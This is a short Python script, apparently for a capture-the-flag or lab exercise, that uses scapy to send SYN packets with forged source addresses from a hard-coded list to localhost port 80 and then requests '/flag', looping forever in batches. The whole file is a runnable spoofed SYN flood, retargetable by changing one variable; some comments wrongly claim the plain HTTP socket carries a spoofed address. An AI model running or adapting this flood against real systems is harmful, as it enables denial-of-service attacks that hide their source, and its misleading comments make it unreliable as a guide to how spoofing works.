import random
import time
import socket
from scapy.all import *

# List of spoofed IPs
spoofed_ips = [
    "192.168.1.100", "10.0.0.2", "172.16.0.3", "198.51.100.4", "203.0.113.5",
    "192.168.1.101", "10.0.0.3", "172.16.0.5", "198.51.100.6", "203.0.113.7"
]

# Target details
target_ip = "127.0.0.1"  # Localhost IP
target_port = 80  # HTTP port
url_path = "/flag"  # The URL path to request
target_host = "localhost"  # Hostname for HTTP requests

def spoofed_tcp_handshake(source_ip):
    # Randomly pick a spoofed IP
    print("Sending handshake from:\t", source_ip)

    # Create IP and TCP headers
    ip = IP(src=source_ip, dst=target_ip)
    tcp = TCP(dport=target_port, sport=random.randint(1024, 65535), flags="S")  # SYN flag

    # Send the SYN packet to initiate TCP handshake
    packet = ip/tcp
    send(packet, verbose=0)

def send_http_request(source_ip):
    # Create a raw socket with the spoofed IP address
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((target_host, target_port))

        # Crafting the HTTP GET request
        http_request = f"GET {url_path} HTTP/1.1\r\nHost: {target_host}\r\nConnection: close\r\n\r\n"

        # Send the HTTP request to the target with the spoofed source IP
        s.sendto(http_request.encode(), (target_ip, target_port))

def flood():
    while True:
        for _ in range(20):  # Send 20 HTTP requests
            source_ip = random.choice(spoofed_ips)
            spoofed_tcp_handshake(source_ip)  # Initiate the SYN handshake with spoofed IP
            send_http_request(source_ip)  # Send the HTTP request to localhost with spoofed IP

        time.sleep(10)  # Wait 10 seconds before sending another batch of requests

# Start the flood
flood()
